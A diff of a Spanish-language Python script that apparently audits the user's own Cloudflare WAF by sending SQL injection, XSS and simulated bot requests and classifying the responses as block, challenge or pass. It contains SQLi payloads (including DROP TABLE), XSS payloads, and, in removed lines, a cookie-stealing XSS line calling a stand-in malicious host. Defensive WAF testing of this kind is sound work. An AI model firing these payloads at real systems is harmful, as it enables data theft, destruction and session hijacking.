@@ -15,193 +15,162 @@ def enviar_log_ataque(mensaje, tipo="info"):
             "timestamp": datetime.now().strftime("%I:%M:%S %p"),
             "origen": "Atacante"
         }
-        requests.post(f"{URL_APLICACION}/log", json=datos)
+        # Nota: Si el WAF es muy estricto, podría bloquear también este log.
+        requests.post(f"{URL_APLICACION}/log", json=datos, timeout=2)
     except:
-        # Si falla el envío, continuamos con el ataque
+        # Si falla el envío, continuamos con el ataque silenciosamente
         pass
 
-def simular_ataque_sqli():
-    """Simula un ataque de inyección SQL con múltiples payloads."""
-    print("🚀 Iniciando simulación de ataques SQL Injection (SQLi)...")
-    print("\nℹ️  SQLi intenta manipular consultas SQL para acceder o modificar datos")
+def analizar_respuesta_waf(respuesta):
+    """
+    Analiza críticamente la respuesta para distinguir entre:
+    1. Bloqueo duro (WAF Block)
+    2. Desafío Interactivo (Managed Challenge / CAPTCHA)
+    3. Acceso permitido (Fallo de seguridad)
+    """
+    html_content = respuesta.text
+    status = respuesta.status_code
+    headers = respuesta.headers
+
+    # Firmas típicas de un Managed Challenge de Cloudflare
+    firmas_challenge = [
+        "Just a moment",
+        "Enable JavaScript",
+        "challenge-platform",
+        "verifying you are human",
+        "turnstile"
+    ]
     
-    # Lista de payloads comunes de SQLi
+    es_challenge = any(firma in html_content for firma in firmas_challenge)
+
+    print(f"\n    Resultados del Análisis:")
+    print(f"    Código de respuesta: {status}")
+    print(f"    Headers relevantes: cf-ray={headers.get('cf-ray', 'N/A')}")
+
+    if es_challenge:
+        mensaje = "🤖 ✅ ÉXITO: Cloudflare lanzó un MANAGED CHALLENGE (CAPTCHA/JS)."
+        detalle = "    El script se quedó atascado en la pantalla de verificación. Un humano vería el CAPTCHA."
+        print(f"\n    {mensaje}")
+        print(detalle)
+        return "challenge", headers.get('cf-ray')
+    
+    elif status == 403:
+        mensaje = "🛡️ ✅ ÉXITO: WAF bloqueó el ataque (Hard Block)."
+        print(f"\n    {mensaje}")
+        return "block", headers.get('cf-ray')
+        
+    elif status == 200:
+        mensaje = "❌ FALLO: El ataque pasó exitosamente (Status 200)."
+        print(f"\n    {mensaje}")
+        print("    Contenido parcial:", html_content[:100].replace('\n', ' '))
+        return "pass", None
+    
+    else:
+        print(f"\n    ⚠️ Estado inesperado: {status}")
+        return "unknown", None
+
+def simular_ataque_sqli():
+    print("🚀 Iniciando simulación de ataques SQL Injection (SQLi)...")
     payloads = [
-        "' OR '1'='1",  # Bypass de autenticación básico
-        "' OR 1=1--",   # Comentar el resto de la consulta
-        "' UNION SELECT * FROM users--",  # Intentar extraer datos de otra tabla
-        "'; DROP TABLE users--",  # Intentar eliminar una tabla
-        "' OR '1'='1' /*",  # Bypass usando comentarios
+        "' OR '1'='1",
+        "' UNION SELECT * FROM users--",
+        "'; DROP TABLE users--"
     ]
     
     for i, payload in enumerate(payloads, 1):
-        objetivo = {
-            0: "Bypass de autenticación",
-            1: "Comentar resto de la consulta",
-            2: "Extraer datos de tabla users",
-            3: "Eliminar tabla de usuarios",
-            4: "Bypass con comentarios alternativos"
-        }[i-1]
+        print(f"\n📌 Prueba SQLi #{i} - Payload: {payload}")
+        enviar_log_ataque(f"⚠️ Test SQLi #{i}", "warning")
         
-        print(f"\n📌 Prueba #{i} - Payload: {payload}")
-        print(f"   Objetivo: {objetivo}")
-        
-        # Enviar log del intento de ataque
-        enviar_log_ataque(f"⚠️ Iniciando ataque SQLi #{i}: {objetivo}", "warning")
-        
-        # La petición maliciosa se envía en la URL
-        peticion_sqli = f"{URL_APLICACION}/?search={payload}"
-        print(f"   URL maliciosa: {peticion_sqli}")
+        url = f"{URL_APLICACION}/?search={payload}"
         
         try:
-            enviar_log_ataque(f"🎯 Intentando SQLi: {payload}", "attack")
-            headers = {
-                "User-Agent": payload
-                }
-            respuesta = requests.get(peticion_sqli, headers=headers)
-
-            print(f"\n   Código de respuesta: {respuesta.status_code}")
-            print(f"   Headers de seguridad:")
-            for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated']:
-                if header in respuesta.headers:
-                    print(f"   - {header}: {respuesta.headers[header]}")
-            
-            if respuesta.status_code == 403:
-                mensaje = "✅ WAF bloqueó el ataque (403 Forbidden)"
-                print("\n   " + mensaje)
-                if 'cf-ray' in respuesta.headers:
-                    id_bloqueo = respuesta.headers['cf-ray']
-                    print(f"   🔍 ID del bloqueo: {id_bloqueo}")
-                    enviar_log_ataque(f"{mensaje}\n🔍 ID del bloqueo: {id_bloqueo}", "success")
-            else:
-                mensaje = "❌ ¡Atención! El ataque no fue bloqueado"
-                print("\n   " + mensaje)
-                contenido = respuesta.text[:200].replace('\n', '\n   ')
-                print("   Contenido de la respuesta (primeros 200 caracteres):")
-                print("   " + contenido)
-                enviar_log_ataque(f"{mensaje}\nContenido expuesto: {contenido[:50]}...", "danger")
-            
-            time.sleep(1)  # Pausa entre ataques
-            
-        except requests.exceptions.RequestException as e:
-            print(f"\n   ❌ Error en la petición: {e}")
+            # User-Agent malicioso típico para forzar reglas
+            headers = {"User-Agent": payload} 
+            respuesta = requests.get(url, headers=headers)
+            analizar_respuesta_waf(respuesta)
+            time.sleep(0.5)
+        except Exception as e:
+            print(f"    ❌ Error: {e}")
 
 def simular_ataque_xss():
-    """Simula múltiples variantes de ataques Cross-Site Scripting (XSS)."""
-    print("\n\n🚀 Iniciando simulación de ataques Cross-Site Scripting (XSS)...")
-    print("\nℹ️  XSS permite inyectar scripts maliciosos que se ejecutan en el navegador de la víctima")
-    
-    # Lista de payloads XSS comunes con diferentes técnicas
-    payloads_xss = [
-        {
-            "payload": "<script>alert('XSS')</script>",
-            "descripcion": "XSS básico usando etiqueta script",
-            "tipo": "Reflected XSS"
-        },
-        {
-            "payload": "<img src='x' onerror='alert(\"XSS\")'>",
-            "descripcion": "XSS usando evento onerror de imagen",
-            "tipo": "DOM-based XSS"
-        },
-        {
-            "payload": "<svg onload='fetch(\"http://malicious-site.com?cookie=\"+document.cookie)'>",
-            "descripcion": "XSS para robo de cookies",
-            "tipo": "Stored XSS"
-        },
-        {
-            "payload": "javascript:alert('XSS')",
-            "descripcion": "XSS en atributo href",
-            "tipo": "DOM-based XSS"
-        },
-        {
-            "payload": "<iframe src='javascript:alert(`XSS`)'>",
-            "descripcion": "XSS usando iframe",
-            "tipo": "Reflected XSS"
-        }
+    print("\n\n🚀 Iniciando simulación de ataques XSS...")
+    payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>"
     ]
     
-    for i, payload_info in enumerate(payloads_xss, 1):
-        print(f"\n📌 Prueba #{i} - {payload_info['tipo']}")
-        print(f"   Descripción: {payload_info['descripcion']}")
-        print(f"   Payload: {payload_info['payload']}")
+    for i, payload in enumerate(payloads, 1):
+        print(f"\n📌 Prueba XSS #{i} - Payload: {payload}")
+        enviar_log_ataque(f"⚠️ Test XSS #{i}", "warning")
         
-        # Enviar log del intento de ataque
-        enviar_log_ataque(f"⚠️ Iniciando ataque XSS #{i}: {payload_info['tipo']}", "warning")
-        enviar_log_ataque(f"📝 Objetivo: {payload_info['descripcion']}", "info")
-        
-        # Se envía el payload tanto en URL como en POST
-        datos_formulario = {
-            "mensaje": payload_info['payload'],
-            "comentario": "Test XSS"
-        }
-        
-        # Probar GET request
+        # Prueba GET
         try:
-            url_con_xss = f"{URL_APLICACION}/?input={payload_info['payload']}"
-            enviar_log_ataque(f"🎯 Intentando XSS via GET: {payload_info['payload']}", "attack")
-            print(f"\n   🔍 Probando GET request:")
-            print(f"   URL: {url_con_xss}")
-            
-            headers = {
-                 "Referer": payload_info['payload']
-                 }
-            respuesta = requests.get(url_con_xss, headers=headers)
-            mostrar_resultado_ataque(respuesta)
-            
-            # Probar POST request
-            print(f"\n   🔍 Probando POST request:")
-            print(f"   Datos: {datos_formulario}")
-            
-            respuesta = requests.post(f"{URL_APLICACION}/submit", data=datos_formulario, headers=headers)
-            mostrar_resultado_ataque(respuesta)
-            
-            time.sleep(1)  # Pausa entre ataques
-            
-        except requests.exceptions.RequestException as e:
-            print(f"\n   ❌ Error en la petición: {e}")
-            
-def mostrar_resultado_ataque(respuesta):
-    """Muestra el resultado detallado de un ataque."""
-    print(f"\n   Código de respuesta: {respuesta.status_code}")
-    print(f"   Headers de seguridad:")
-    for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated', 'content-security-policy']:
-        if header in respuesta.headers:
-            print(f"   - {header}: {respuesta.headers[header]}")
+            print("    [GET Request]")
+            headers = {"Referer": payload} # Cloudflare suele mirar Referer o URI
+            respuesta = requests.get(f"{URL_APLICACION}/?input={payload}", headers=headers)
+            analizar_respuesta_waf(respuesta)
+        except Exception as e:
+            print(f"    ❌ Error: {e}")
+
+def simular_ataque_bot():
+    """
+    Simula una 'Botnet' con 6 identidades diferentes 
+    para probar la consistencia del Managed Challenge (CAPTCHA).
+    """
+    print("\n\n🤖 Iniciando simulación de BOTNET (6 Intentos)...")
+    print("ℹ️  Objetivo: Verificar que Cloudflare detiene múltiples intentos automatizados.")
     
-    if respuesta.status_code == 403:
-        print("\n   ✅ WAF bloqueó el ataque (403 Forbidden)")
-        if 'cf-ray' in respuesta.headers:
-            print(f"   🔍 ID del bloqueo: {respuesta.headers['cf-ray']}")
-    else:
-        print("\n   ❌ ¡Atención! El ataque no fue bloqueado")
-        print("   Contenido de la respuesta (primeros 200 caracteres):")
-        print("   " + respuesta.text[:200].replace('\n', '\n   '))
+    # La "llave" para activar tu regla de Cloudflare
+    parametro_trigger = "simular_bot=1" 
+    url = f"{URL_APLICACION}/?{parametro_trigger}"
+    
+    # Lista ampliada a 6 "identidades" para simular diferentes herramientas de ataque
+    user_agents_bots = [
+        "python-requests/script-malicioso-v1",       # 1. Script básico
+        "Mozilla/5.0 (compatible; EvilBot/1.0)",     # 2. Bot autodeclarado
+        "curl/7.64.1 (headless-scraper)",            # 3. Herramienta de consola
+        "Go-http-client/1.1 (bot-network)",          # 4. Bot escrito en Go
+        "Apache-HttpClient/4.5.13 (Java/1.8)",       # 5. Bot basado en Java
+        "Wget/1.21.1 (linux-gnu)"                    # 6. Descargador clásico
+    ]
+
+    for i, agente in enumerate(user_agents_bots, 1):
+        print(f"\n📌 Intento de Bot #{i} de 6")
+        print(f"    Identidad simulada: {agente}")
+        
+        try:
+            headers = {
+                'User-Agent': agente,
+                'Accept': 'text/html,application/xhtml+xml'
+            }
+            
+            # Pequeña pausa para asegurar que el log se vea ordenado
+            if i > 1: time.sleep(1.5)
+            
+            respuesta = requests.get(url, headers=headers)
+            resultado, ray_id = analizar_respuesta_waf(respuesta)
+            
+            if resultado == "challenge":
+                 enviar_log_ataque(f"✅ Bot #{i} detenido por Captcha. RayID: {ray_id}", "success")
+            elif resultado == "block":
+                 enviar_log_ataque(f"✅ Bot #{i} bloqueado totalmente. RayID: {ray_id}", "success")
+            else:
+                 enviar_log_ataque(f"❌ Bot #{i} logró entrar sin desafío.", "danger")
+
+        except requests.exceptions.RequestException as e:
+            print(f"    ❌ Error de conexión: {e}")
 
 if __name__ == "__main__":
-    print("\n🔒 Script de Simulación de Ataques Web - Prueba de Seguridad Cloudflare 🔒")
-    print("=" * 70)
-    print("\nEste script simula dos tipos comunes de ataques web para probar la seguridad:")
-    print("\n1. SQL Injection (SQLi):")
-    print("   - Intenta explotar vulnerabilidades en la base de datos")
-    print("   - Puede permitir acceso no autorizado a datos sensibles")
-    print("   - El WAF debe detectar y bloquear patrones maliciosos en la URL")
+    print("\n🔒 AUDITORÍA DE SEGURIDAD - CLOUDFLARE EDGE 🔒")
+    print("=" * 60)
+    print(f"Objetivo: {URL_APLICACION}")
+    print("=" * 60)
     
-    print("\n2. Cross-Site Scripting (XSS):")
-    print("   - Intenta inyectar código JavaScript malicioso")
-    print("   - Puede robar cookies de sesión o modificar el contenido de la página")
-    print("   - El WAF debe detectar y bloquear scripts maliciosos")
+    input("\nPresiona Enter para iniciar la batería de pruebas...")
     
-    print("\nObjetivo: Verificar que el WAF de Cloudflare bloquea estos ataques")
-    print("URL objetivo:", URL_APLICACION)
-    print("=" * 70 + "\n")
-    
-    input("Presiona Enter para iniciar la simulación de ataques...")
-    
-    # Ejecutar la simulación de SQLi
     simular_ataque_sqli()
-    
-    print("\n" + "=" * 70 + "\n")
-    time.sleep(2) # Espera 2 segundos antes del siguiente ataque
-    
-    # Ejecutar la simulación de XSS
     simular_ataque_xss()
+    simular_ataque_bot() # <-- Nueva llamada a la función
+    
+    print("\n" + "=" * 60)
+    print("🏁 Auditoría finalizada.")
